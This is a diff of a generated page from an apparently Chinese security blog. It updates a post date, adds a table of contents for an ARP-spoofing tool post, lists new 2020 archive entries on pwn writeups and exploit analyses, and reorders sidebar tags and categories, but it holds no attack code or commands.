-            </p><p>更新日期：<a href="http://yoursite.com/2019/05/27/自己动手写工具(3)--ARP欺骗/">July 9th 2019, 5:15:30 pm</a>
+            </p><p>更新日期：<a href="http://yoursite.com/2019/05/27/自己动手写工具(3)--ARP欺骗/">January 3rd 2020, 11:06:36 am</a>
             </p><p>版权声明：本文采用<a rel="license" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
         </div>
     
@@ -563,7 +559,7 @@ top:50vh;
         <div class="toc-catalog">
             <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
         </div>
-        
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP协议"><span class="toc-number">1.</span> <span class="toc-text">ARP协议</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ARP欺骗原理"><span class="toc-number">2.</span> <span class="toc-text">ARP欺骗原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Scapy库的介绍"><span class="toc-number">3.</span> <span class="toc-text">Scapy库的介绍</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#代码实现"><span class="toc-number">4.</span> <span class="toc-text">代码实现</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1-广播投毒"><span class="toc-number">4.0.1.</span> <span class="toc-text">1.广播投毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2-定向投毒"><span class="toc-number">4.0.2.</span> <span class="toc-text">2.定向投毒</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#3-双向欺骗，窃听流量"><span class="toc-number">4.0.3.</span> <span class="toc-text">3.双向欺骗，窃听流量</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#4-还原流量中的文件内容"><span class="toc-number">4.0.4.</span> <span class="toc-text">4.还原流量中的文件内容</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#DNS欺骗"><span class="toc-number">4.1.</span> <span class="toc-text">DNS欺骗</span></a></li></ol></li></ol>
     </div>
     
     <div class="back-top iconfont-archer">&#xe639;</div>
@@ -1097,9 +1093,161 @@ top:50vh;
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 37
+        Total : 45
         </div>
         <!-- search  -->
         
@@ -1109,6 +1257,60 @@ top:50vh;
     
     
     
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href="/2020/03/15/BUUCTF_pwn_writeup/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href="/2020/03/14/ctfhub_pwn刷题WP/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href="/2020/03/11/Pwnable.kr详解/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2020/03/05/SQL词义分析(状态自动机)/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/Mikrotik Chimay-Red 分析/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2020/03/02/how2heap/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href="/2020/02/09/HITCON Training Writeup/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href="/2020/02/07/pwnxyz/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href="/2020/01/03/PowerPC汇编学习/">PowerPC汇编学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
@@ -1171,11 +1373,6 @@ top:50vh;
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/27</span><a class="archive-post-title" href="/2019/09/27/看雪KCTF2019wp/">看雪KCTF2019wp</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/25</span><a class="archive-post-title" href="/2019/09/25/与权权的秦皇岛之行/">与权权的秦皇岛之行</a>
         </li>
     
     
@@ -1250,22 +1447,22 @@ top:50vh;
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/使用动态规划-DP-解决最大公共子串与最大公共子序列问题/">使用动态规划(DP)解决最大公共子串与最大公共子序列问题</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/素数个数求解与素数的判定/">素数个数求解与素数的判定</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/使用动态规划-DP-解决最大公共子串与最大公共子序列问题/">使用动态规划(DP)解决最大公共子串与最大公共子序列问题</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/自己动手写工具(2)--TCP代理/">自己动手写工具(2)--TCP代理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
         </li>
     
     
@@ -1303,17 +1500,19 @@ top:50vh;
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
     
         <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
     
-        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
-    
         <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
     
         <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
+    
+        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="powerpc,汇编"><span class="iconfont-archer">&#xe606;</span>powerpc,汇编</span>
     
         <span class="sidebar-tag-name" data-tags="SSH,端口转发"><span class="iconfont-archer">&#xe606;</span>SSH,端口转发</span>
     
@@ -1329,11 +1528,11 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
     
+        <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
+    
         <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
     
         <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
-    
-        <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
     
@@ -1343,9 +1542,9 @@ top:50vh;
     
         <span class="sidebar-tag-name" data-tags="CCProxy,栈溢出,pwn"><span class="iconfont-archer">&#xe606;</span>CCProxy,栈溢出,pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="Linux,GOT,PLT"><span class="iconfont-archer">&#xe606;</span>Linux,GOT,PLT</span>
-    
         <span class="sidebar-tag-name" data-tags="unlink,heap,pwn,Android"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn,Android</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux,GOT,PLT"><span class="iconfont-archer">&#xe606;</span>Linux,GOT,PLT</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,Heap"><span class="iconfont-archer">&#xe606;</span>pwn,Heap</span>
     
@@ -1402,19 +1601,17 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
-    
         <span class="sidebar-category-name" data-categories="ACM"><span class="iconfont-archer">&#xe60a;</span>ACM</span>
     
         <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
     
-        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
-    
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
-        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
     
-        <span class="sidebar-category-name" data-categories="爱的日记"><span class="iconfont-archer">&#xe60a;</span>爱的日记</span>
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
         <span class="sidebar-category-name" data-categories="社工"><span class="iconfont-archer">&#xe60a;</span>社工</span>
     
